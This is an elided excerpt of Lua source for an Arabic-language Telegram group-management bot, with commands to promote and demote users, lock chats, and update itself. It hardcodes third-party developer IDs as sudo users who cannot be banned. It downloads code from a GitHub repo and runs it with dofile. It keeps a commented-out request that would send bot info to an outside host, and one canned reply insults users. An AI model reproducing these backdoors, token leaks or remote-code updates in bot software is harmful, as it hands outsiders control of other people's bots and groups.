...
--https.request('https://devdeiveddev.ml/api/tervo.php/?insert='..JSON.encode(infotnseb))
create_config_auto()
botUserName = database:get(id_server..":token_username")
token = database:get(id_server..":token")
SUDO = database:get(id_server..":SUDO:ID")
...
io.popen("cd File_Bot && wget https://raw.githubusercontent.com/DEV-3YAD/ggg/main/File_Bot/commands.lua") 
...
sudo_users = {SUDO,1360140225,837576238,1872563195}   
...
var = true
elseif tonumber(user_id) == tonumber(837576238) then
var = true
elseif tonumber(user_id) == tonumber(1872563195) then
var = true
...
elseif database:sismember(bot_id..'CoSu'..chat_id, user_id) then
var = database:get(bot_id.."CoSu:Rd"..msg.chat_id_) or 'تريفر'
elseif database:sismember(bot_id..'Basic:Constructor'..chat_id, user_id) then
...
sendAudio(msg.chat_id_,msg.id_,'./'..ffrr,"🎼 ¹𝐓𝐑𝐄𝐕𝐎𝐑¹")  
...
local trevor_0 = database:get(bot_id..'text:ch:user')
if trevor_0 then
send(msg.chat_id_, msg.id_,'['..trevor_0..']')
else
...
os.execute('wget https://raw.githubusercontent.com/DEV-3YAD/ggg/main/DRAGON.lua')
send(msg.chat_id_, msg.id_,'◉ تم تحديث السورس')
dofile('DRAGON.lua')  
end
if text == 'الاصدار ' and DevSoFi(msg) then 
database:del(bot_id..'Srt:Bot') 
send(msg.chat_id_, msg.id_,' ◉ اصدار سورس تريفر { s: 6.7}')
end
if text == 'فرعون' and DevSoFi(msg) then
database:del(bot_id..'Srt:Bot') 
local Text = [[ 
[DEV](t.me/Fr3on1)
]] 
...
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '  ✤ ⁽مبرمج تريفر₎ ✤ ',url="t.me/trrevor"}},
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = 'قناه السورس️️', url="t.me/trevor_0"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
usertext = '\n ◉ العضو ← ['..result.title_..'](t.me/'..(username or 'trevor_0')..')'
status  = '\n ◉ تم ترقيته مطور'
...
usertext = '\n ◉ العضو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'trevor_0')..')'
status  = '\n ◉ تم ترقيته مطور'
...
if DRAGON1_Msg then 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ◉ العضو ← ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'trevor_0')..') \n ◉ '..DRAGON1_Msg)
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
end,nil)
end
...
send(msg.chat_id_,0," ◉ العضو : {["..data.first_name_.."](T.ME/trevor_0)}\n ◉ ["..DRAGON_Msg.."] \n")
end
end,nil)   
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
...
os.execute('rm -rf DRAGON.lua')
os.execute('wget https://raw.githubusercontent.com/DEV-3YAD/ggg/main/DRAGON.lua')
os.execute('wget https://raw.githubusercontent.com/DEV-3YAD/ggg/main/library')
os.execute('wget https://raw.githubusercontent.com/DEV-3YAD/ggg/main/File_Bot')
send(msg.chat_id_, msg.id_,' ◉ تم تحديث السورس')
dofile('DRAGON.lua')  
end
...
if text == 'زيكو' or text == 'مبرمج تريفر' then
local msg_id = msg.id_/2097152/0.5
local Text = [[
 المبرمج هارفي 
]]
keyboard = {} 
keyboard.inline_keyboard = {{{text = '  𓌹 ˹زيكو¹˼ 𓌺 ',url="t.me/trrevor"}},}
...
keyboard = {} 
keyboard.inline_keyboard = {{{text = '  𓌹 ˹فرعون¹˼ 𓌺 ',url="t.me/Fr3on1"}},}
...
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '  ◍ D𝙴𝚅𝙴𝙻𝙾𝙿𝙴𝚁 𖣌 ',url="t.me/trrevor"},{text = ' ◍ D𝙴𝚅𝙴𝙻𝙾𝙿𝙴𝚁 𖣌 ',url="t.me/Fr3on1"}},
{{text = '  ◍ M𝚈 𝙲𝙷𝙰𝙽𝙽𝙴𝙻𝚂 𖣌 ', url="t.me/trevor_0"}},
{{text = '   ²₀²₁ ˝₀₄˝₁₃ | ₁₂:₀₀ 𝙿𝙼  ', url="t.me/trevor_0"}},
...
local Text = [[
 ◉ اهلا بك في سورس تريفر الجمدان لو عايز بوت بأسعار منسبه وبوت مميز كلمني  ◉ 
]]
keyboard = {} 
keyboard.inline_keyboard = {
...
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '  𖣘 ⁽SＯＵＲＣＥ₎ 𖣘', url="t.me/trevor_0"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
if text == '◁━━━━◈¹𝐓𝐑𝐄𝐕𝐎𝐑¹◈━━━━▷' then
local Text = [[ 
◉من أحسن السورسات على التليجرام سورس تريفر◉
...
if text == 'العاب تريفر' or text == 'العاب مطوره' or text == 'العاب متطوره' then  
local Text = [[  
 ◉ اهلا في قائمه الالعاب المتطوره سورس تريفر  ◉ 
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data)  
send(msg.chat_id_, msg.id_,' ◉ بواسطه ← ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'trevor_0')..') \n ◉ تـم قفـل الدردشه ')
end,nil)   
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ◉ بواسطه ← ['..string.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'trevor_0')..') \n ◉ تـم قفـل التاك بالكتم ')
end,nil)   
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data)  
send(msg.chat_id_, msg.id_,'\n☉┇تم قفل البوتات بالطرد\n☉┇تم وضع الايدي بدون صوره\n☉┇تم قفل التكرار بالطرد\n☉┇تم قفل الروابط\n☉┇تم قفل التوجيه\n☉┇تم قفل الملصقات\n☉┇تم قفل المتحركه\n☉┇تم قفل الفيديو\n☉┇تم قفل السب\n☉┇تم قفل التعديل\n☉┇تم قفل الفارسيه\n☉┇تم قفل التفليش\n\nتم تفعيل الحمايه بواسطه »>['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'trevor_0')..')')   
end,nil) 
end
--------------------------------------------------------------------------------------------------------------
...
if tonumber(result.sender_user_id_) == tonumber(837576238) then  
send(msg.chat_id_, msg.id_, " ◉ لا تسطيع حظر مبرمج السورس عام")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(1872563195) then  
...
if result.id_ == tonumber(837576238) then
send(msg.chat_id_, msg.id_, " ◉ لا يمكنك حظر مبرمج السورس \n")
return false 
end
if result.id_ == tonumber(1872563195) then
...
if tonumber(userid) == tonumber(1872563195) then  
send(msg.chat_id_, msg.id_, " ◉ لا تسطيع حظر مبرمج باور عام")
return false 
end
if tonumber(userid) == tonumber(837576238) then  
send(msg.chat_id_, msg.id_, " ◉ لا تسطيع حظر مبرمج السورس عام")
return false 
end
...
if DevSoFi(msg) then
local Get_Files, res = https.request("https://raw.githubusercontent.com/DEV-3YAD/ggg/main/getfile.json")
if res == 200 then
local Get_info, res = pcall(JSON.decode,Get_Files);
vardump(res.plugins_)
if Get_info then
local TextS = "\n ◉ اهلا بك في متجر ملفات تريفر\n ◉ ملفات السورس ↓\n≪◤━───━??𝗼𝗼𝗼𝗻━───━◥≫\n\n"
...
local json_file, res = https.request("https://raw.githubusercontent.com/DEV-3YAD/ggg/main/File_Bot/"..file)
if res == 200 then
os.execute("rm -fr File_Bot/"..file)
send(msg.chat_id_, msg.id_,t) 
dofile('DRAGON.lua')  
else
send(msg.chat_id_, msg.id_," ◉ عذرا الملف لايدعم سورس تريفر \n") 
end
return false
end
...
if text == ("مسح قائمه تريفر") and Sudo(msg) then
database:del(bot_id..'CoSu'..msg.chat_id_)
send(msg.chat_id_, msg.id_, '\n ◉ تم مسح قائمه تريفر')
return false
end

if text == 'قائمه تريفر' and Sudo(msg) then
...
if text == ("رفع تريفر") and msg.reply_to_message_id_ and Sudo(msg) then
if AddChannel(msg.sender_user_id_) == false then
local trevor_0 = database:get(bot_id..'text:ch:user')
if trevor_0 then
send(msg.chat_id_, msg.id_,'['..trevor_0..']')
...
if text and text:match("^رفع تريفر @(.*)$") and Sudo(msg) then
local username = text:match("^رفع تريفر @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local trevor_0 = database:get(bot_id..'text:ch:user')
if trevor_0 then
send(msg.chat_id_, msg.id_,'['..trevor_0..']')
...
if text and text:match("^رفع تريفر (%d+)$") and Sudo(msg) then
local userid = text:match("^رفع تريفر (%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local trevor_0 = database:get(bot_id..'text:ch:user')
if trevor_0 then
send(msg.chat_id_, msg.id_,'['..trevor_0..']')
...
if text == ("تنزيل تريفر") and msg.reply_to_message_id_ and Sudo(msg) then
if AddChannel(msg.sender_user_id_) == false then
local trevor_0 = database:get(bot_id..'text:ch:user')
if trevor_0 then
send(msg.chat_id_, msg.id_,'['..trevor_0..']')
...
if text and text:match("^تنزيل تريفر @(.*)$") and Sudo(msg) then
local username = text:match("^تنزيل تريفر @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local trevor_0 = database:get(bot_id..'text:ch:user')
if trevor_0 then
send(msg.chat_id_, msg.id_,'['..trevor_0..']')
...
if text and text:match("^تنزيل تريفر (%d+)$") and Sudo(msg) then
local userid = text:match("^تنزيل تريفر (%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local trevor_0 = database:get(bot_id..'text:ch:user')
if trevor_0 then
send(msg.chat_id_, msg.id_,'['..trevor_0..']')
...
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n ◉ لعضو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'trevor_0')..')'
status  = '\n ◉ تم تنزيله من المميزين'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n ◉ العضو ← '..userid..''
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ◉ العضــو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'trevor_0')..')'
...
if blakrt == 'مميز' and Mod(msg) then
send(msg.chat_id_, msg.id_,'\n ◉ العضو ← ['..result.title_..'](t.me/'..(text1[3] or 'trevor_0')..')'..'\n ◉ تم رفعه '..text1[2]..'')   
database:sadd(bot_id..'Special:User'..msg.chat_id_,result.id_)  
...
database:set(bot_id.."trevor_0:insta_bot"..msg.chat_id_,"close")
end
if text == "تفعيل الانستا" and Manager(msg) then
send(msg.chat_id_, msg.id_,' تم تفعيل الانستا')
database:set(bot_id.."trevor_0:insta_bot"..msg.chat_id_,"open")
end
if text and text:match("^معلومات (.*)$") and database:get(bot_id.."trevor_0:insta_bot"..msg.chat_id_) == "open" then
...
database:set(bot_id.."trevor_0:Tag:Admins:"..msg.chat_id_,true)
send(msg.chat_id_, msg.id_,"◉تم تفعيل تاك المشرفين")
end
if text and text == "تعطيل تاك المشرفين" and Manager(msg) then 
database:del(bot_id.."trevor_0:Tag:Admins:"..msg.chat_id_)
...
if database:get(bot_id.."trevor_0:Tag:Admins:"..msg.chat_id_) then 
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data)
...
end --الكود حصري سورس تريفر يعني لو بكتهن راح اعرفك انت الاخذتهن
...
-------------------------------
if text == ""..(database:get(bot_id..'Name:Bot') or 'تريفر').." غادر" or text == 'غادر' then  
...
send(msg.chat_id_,msg.id_, '[انت مطوري نور عنيا🥺🤍](t.me/trevor_0)') 
return false
end
...
send(msg.chat_id_,msg.id_, '[انت مجرد عضو زليل حقير ملوش لزمه 😂](t.me/trevor_0)') 
return false
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[وانا كمان بحبك .🥺❤️](t.me/trevor_0)') 
return false
end
end
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[خدوني معاكم بيف ..🙄💔](t.me/trevor_0)')
return false
end
end
end
...
if text == ""..(database:get(bot_id..'Name:Bot') or 'تريفر').."" then  
Namebot = (database:get(bot_id..'Name:Bot') or 'تريفر')
local DRAGON_Msg = {
'ننعم يروحي 😻💙',
'نعم يا قلب  '..Namebot..'',
'عاوز اي من '..Namebot..'',
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(extra,data) 
local rtp = Rutba(result.sender_user_id_,msg.chat_id_)
local username = ' ['..data.first_name_..'](t.me/'..(data.username_ or 'trevor_0')..')'
local iduser = result.sender_user_id_
...
{
{text = ' 𝚂𝙾𝚄𝚁𝙲𝙴 𝙰𝚅𝙸𝚁𝙰', url="t.me/trevor_0"},
},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
...
local Name_Bot = (database:get(bot_id..'Name:Bot') or 'تريفر')
